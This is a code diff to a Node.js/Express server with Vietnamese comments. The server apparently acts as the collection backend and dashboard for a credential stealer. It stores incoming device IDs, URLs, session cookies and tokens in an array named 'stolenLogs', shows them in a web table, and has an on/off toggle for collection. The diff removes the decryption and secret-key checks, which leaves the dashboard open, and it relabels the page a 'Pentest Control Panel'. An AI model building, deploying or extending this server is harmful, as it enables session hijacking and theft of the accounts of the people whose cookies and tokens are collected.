@@ -5,63 +5,28 @@ const PORT = process.env.PORT || 3000;
 app.use(express.json());
 
 let stolenLogs = [];
-let globalCollectionEnabled = false; 
+let globalCollectionEnabled = false; // Mặc định tắt
 
-// 🔐 Khóa bí mật chung (Hãy đổi thành một chuỗi khó đoán của riêng bạn)
-const SECRET_KEY = "tin1612006";
-
-// Hàm giải mã dữ liệu từ client
-function decryptData(encryptedBase64, secret) {
-  try {
-    var decoded = decodeURIComponent(escape(atob(encryptedBase64)));
-    var decrypted = "";
-    for (var i = 0; i < decoded.length; i++) {
-      var charCode = decoded.charCodeAt(i) ^ secret.charCodeAt(i % secret.length);
-      decrypted += String.fromCharCode(charCode);
-    }
-    return JSON.parse(decrypted);
-  } catch (e) {
-    return null;
-  }
-}
-
-// 1. API bật/tắt thu thập (Yêu cầu truyền đúng ?key=...)
+// 1. API chuyển đổi trạng thái (Nhận yêu cầu từ nút bấm trực quan trên web)
 app.get('/toggle', (req, res) => {
-    if (req.query.key !== SECRET_KEY) {
-        return res.status(401).send("⛔ Truy cập bị từ chối! Sai hoặc thiếu mã khóa bảo mật.");
-    }
     globalCollectionEnabled = !globalCollectionEnabled;
-    res.send(`Trạng thái thu thập hiện tại: ${globalCollectionEnabled ? 'ĐANG BẬT 🟢' : 'ĐANG TẮT 🔴'}`);
+    // Nếu gọi từ web, tự động chuyển hướng (redirect) về lại trang chủ để cập nhật giao diện nút bấm
+    res.redirect('/');
 });
 
-// 2. API kiểm tra trạng thái (Client phải gửi đúng Header Authorization hoặc Query Key)
+// 2. API cho client kiểm tra trạng thái
 app.get('/status', (req, res) => {
-    const clientKey = req.headers['authorization'] || req.query.key;
-    if (clientKey !== SECRET_KEY) {
-        return res.status(403).json({ error: "Unauthorized" });
-    }
     res.json({ collect: globalCollectionEnabled });
 });
 
-// 3. API nhận dữ liệu mã hóa từ Client
+// 3. API nhận dữ liệu từ Client (Chỉ nhận khi server bật)
 app.post('/', (req, res) => {
     if (!globalCollectionEnabled) {
         return res.status(403).json({ status: "skipped" });
     }
 
-    const { data } = req.body;
-    if (!data) {
-        return res.status(400).json({ status: "error" });
-    }
-
-    // Giải mã dữ liệu; nếu sai SECRET_KEY, hàm decrypt trả về null -> Chặn ngay lập tức
-    const decryptedPayload = decryptData(data, SECRET_KEY);
-    if (!decryptedPayload) {
-        return res.status(403).json({ status: "error", message: "Invalid signature" });
-    }
-
-    const { deviceId, url, cookie, token } = decryptedPayload;
-
+    const { deviceId, url, cookie, token } = req.body;
+    
     stolenLogs.push({
         time: new Date().toLocaleString(),
         deviceId: deviceId || 'Thiết bị không rõ',
@@ -77,18 +42,8 @@ app.post('/', (req, res) => {
     res.status(200).json({ status: "success" });
 });
 
-// 4. Giao diện trang chủ xem Log (BẮT BUỘC CÓ ?key=... MỚI XEM ĐƯỢC)
+// 4. Giao diện trang chủ có Nút Bật/Tắt Trực Quan và Lọc Thiết Bị
 app.get('/', (req, res) => {
-    if (req.query.key !== SECRET_KEY) {
-        return res.status(401).send(`
-            <div style="font-family: sans-serif; text-align: center; margin-top: 50px;">
-                <h2 style="color: red;">⛔ 401 - Unauthorized</h2>
-                <p>Bạn không có quyền truy cập vào bảng điều khiển này.</p>
-                <p>Vui lòng truy cập đúng đường dẫn kèm mã khóa, ví dụ: <code>/?key=YOUR_SECRET_KEY</code></p>
-            </div>
-        `);
-    }
-
     const selectedDevice = req.query.device || 'all';
     let logRows = '';
     
@@ -104,7 +59,7 @@ app.get('/', (req, res) => {
     });
 
     if (filteredLogs.length === 0) {
-        logRows = `<tr><td colspan="5" style="text-align:center; padding: 20px; color: #888;">Chưa có dữ liệu...</td></tr>`;
+        logRows = `<tr><td colspan="5" style="text-align:center; padding: 20px; color: #888;">Chưa có dữ liệu cho thiết bị này...</td></tr>`;
     } else {
         filteredLogs.slice().reverse().forEach((log) => {
             logRows += `
@@ -119,27 +74,52 @@ app.get('/', (req, res) => {
         });
     }
 
+    // Thiết kế giao diện nút bấm trực quan (UI Toggle Button)
+    const btnStyle = globalCollectionEnabled 
+        ? "background-color: #28a745; color: white;" 
+        : "background-color: #dc3545; color: white;";
+    const btnText = globalCollectionEnabled 
+        ? "🟢 ĐANG BẬT (Click để Tắt)" 
+        : "🔴 ĐANG TẮT (Click để Bật)";
+
     res.send(`
     <!DOCTYPE html>
     <html lang="vi">
     <head>
         <meta charset="UTF-8">
-        <title>Secure Control Panel</title>
+        <title>Pentest Control Panel - Dashboard</title>
     </head>
     <body style="font-family: system-ui, sans-serif; margin: 30px; background-color: #f8f9fa;">
-        <h2 style="color: #333; border-bottom: 2px solid #333; padding-bottom: 10px;">🛡️ Bảng Điều Khiển Bảo Mật (Secure Pentest Logs)</h2>
-        <div style="margin-bottom: 20px;">
-            <label style="font-weight: bold; margin-right: 10px;">Lọc thiết bị:</label>
-            <select onchange="location.href='/?key=${SECRET_KEY}&device=' + this.value" style="padding: 8px; border-radius: 5px; border: 1px code solid #ccc;">
+        <h2 style="color: #333; border-bottom: 2px solid #333; padding-bottom: 10px;">🛡️ Bảng Điều Khiển Pentest Logs</h2>
+        
+        <!-- Khu vực điều khiển trực quan -->
+        <div style="display: flex; align-items: center; justify-content: space-between; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); margin-bottom: 20px;">
+            <div>
+                <h3 style="margin: 0 0 5px 0; color: #333;">Trạng thái hệ thống thu thập</h3>
+                <p style="margin: 0; color: #666; font-size: 14px;">Khi bật, các thiết bị có cài script sẽ tự động gửi log về đây.</p>
+            </div>
+            <div>
+                <a href="/toggle" style="text-decoration: none; padding: 12px 24px; font-size: 16px; font-weight: bold; border-radius: 6px; ${btnStyle} display: inline-block; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
+                    ${btnText}
+                </a>
+            </div>
+        </div>
+
+        <!-- Thanh lọc thiết bị -->
+        <div style="margin-bottom: 20px; background: white; padding: 15px 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.05);">
+            <label style="font-weight: bold; margin-right: 10px;">Lọc theo thiết bị:</label>
+            <select onchange="location.href='/?device=' + this.value" style="padding: 8px; border-radius: 5px; border: 1px solid #ccc; width: 250px;">
                 ${deviceOptions}
             </select>
         </div>
+
+        <!-- Bảng hiển thị log -->
         <table style="width: 100%; border-collapse: collapse; background: white; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border-radius: 8px; overflow: hidden;">
             <thead>
                 <tr style="background-color: #343a40; color: white; text-align: left;">
                     <th style="padding: 12px; width: 15%;">Thời gian</th>
                     <th style="padding: 12px; width: 15%;">Tên thiết bị</th>
-                    <th style="padding: 12px; width: 20%;">URL</th>
+                    <th style="padding: 12px; width: 20%;">Ứng dụng / URL</th>
                     <th style="padding: 12px; width: 25%;">Cookie</th>
                     <th style="padding: 12px; width: 25%;">Token</th>
                 </tr>
@@ -154,5 +134,5 @@ app.get('/', (req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log(`🚀 Secure Server chạy tại cổng ${PORT}`);
+    console.log(`🚀 Server hoạt động tại cổng ${PORT}`);
 });
